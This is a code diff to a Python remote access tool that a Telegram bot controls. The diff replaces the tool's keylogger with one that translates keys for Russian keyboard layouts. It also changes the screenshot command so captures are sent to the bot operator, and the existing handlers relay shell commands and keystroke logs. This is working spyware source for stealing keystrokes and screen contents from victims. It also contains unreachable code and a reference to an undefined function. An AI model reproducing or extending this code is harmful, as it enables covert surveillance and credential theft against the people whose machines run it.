@@ -11,6 +11,10 @@ import traceback
 import threading
 import util
 import config
+import keyboard
+import ctypes
+
+
 
 # packages
 if sys.platform == 'win32':
@@ -64,15 +68,21 @@ def cmd(message):
                     bot.send_message(message.chat.id, result)
         except Exception as error:
             bot.send_message(message.chat.id, "Error: " +str(error))
+def on_exists(fname: str) -> None:
+    try:
+        bot.send_photo(chat_id, photo=open(fname,"rb").read())
+    except:
+        traceback.print_exc()
 
 @bot.message_handler(commands=["screenshot"])
 def screenshot(message):
+    global chat_id
+    chat_id=message.chat.id
     try:
-        with mss.mss() as screen:
-            for m in screen.monitors:
-                img = screen.grab(m)
-                data = util.png(img)
-                bot.send_photo(message.chat.id, photo=data)
+        with mss.mss() as sct:
+            filename = sct.shot(output="mon-{mon}.png", callback=on_exists)
+
+                
     except Exception as e:
         traceback.print_exc()
 
@@ -109,52 +119,39 @@ any other message will be as a command
 upload files via attach
  """)
 
-def _event(event):
-    global logs
-    global window
-    try:
-        if event.WindowName != window:
-            window = event.WindowName
-            logs.write("\n[{}]\n".format(window))
-        if event.Ascii > 32 and event.Ascii < 127:
-            logs.write(chr(event.Ascii))
-        elif event.Ascii == 32:
-            logs.write(' ')
-        elif event.Ascii in (10,13):
-            logs.write('\n')
-        elif event.Ascii == 8:
-            logs.write('<BACKSPACE>')
-        elif event.Ascii == 9:
-            logs.write('<TAB>')
-        elif event.Ascii == 27:
-            logs.write('<ESC>')
+eng_layout="""QWERTYUIOP{}ASDFGHJKL:"ZXCVBNM<>qwertyuiop[]asdfghjkl;'zxcvbnm,."""
+rus_layout="""ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮйцукенгшщзхъфывапролджэячсмитьбю"""
+
+def callback(event=None):
+     if not event:
+         return
+     user32 = ctypes.WinDLL('user32', use_last_error=True)
+     curr_window = user32.GetForegroundWindow()
+     thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
+     klid = user32.GetKeyboardLayout(thread_id)
+     lid = klid & (2**16 - 1)
+     lid_hex = hex(lid)
+
+     name = event.name
+     if len(name) > 1:
+        if name == "space":
+            name = " "
+        elif name == "enter":
+            name = "[ENTER]\n"
+        elif name == "decimal":
+            name = "."
         else:
-            logs.write(f"<KEY_{event.Ascii}>")
-            pass
-    except Exception as e:
-        traceback.print_exc()
-    return True
+            name = name.replace(" ", "_")
+            name = f"[{name.upper()}]"
+     else:
+        if lid_hex=="0x419":
+            pos = eng_layout.find(name)
+            if pos!=-1 and pos < len(rus_layout):
+                name = rus_layout[pos]
 
-def _run_windows():
-    global abort
-    while True:
-        hm = hook_manager.HookManager()
-        hm.KeyDown = _event
-        hm.HookKeyboard()
-        pythoncom.PumpMessages()
-        if abort:
-            break
+     logs.write(name)
 
-def _run():
-    global abort
-    hm = hook_manager.HookManager()
-    hm.KeyDown = _event
-    hm.HookKeyboard()
-    hm.start()
-    while True:
-        time.sleep(0.1)
-        if abort:
-            break   
+
 
 @bot.message_handler(commands=["getkeylog"])
 def getkeylog(message):
@@ -167,14 +164,13 @@ def getkeylog(message):
 
 @bot.message_handler(commands=["keylog"])
 def keylog(message):
+    keyboard.on_release(callback=callback)
+    return
+
     global threads
     try:
-        if 'keylogger' not in threads or not threads['keylogger'].is_alive():
-            if os.name == 'nt':
-                threads['keylogger'] = threading.Thread(target=_run_windows, name=time.time())
-            else:
-                threads['keylogger'] = threading.Thread(target=_run, name=time.time())
-            threads['keylogger'].start()
+        keyboard_listener = keyboard.Listener(on_press=on_key_press)
+        keyboard_listener.start()
     except Exception as e:
         traceback.print_exc()
 
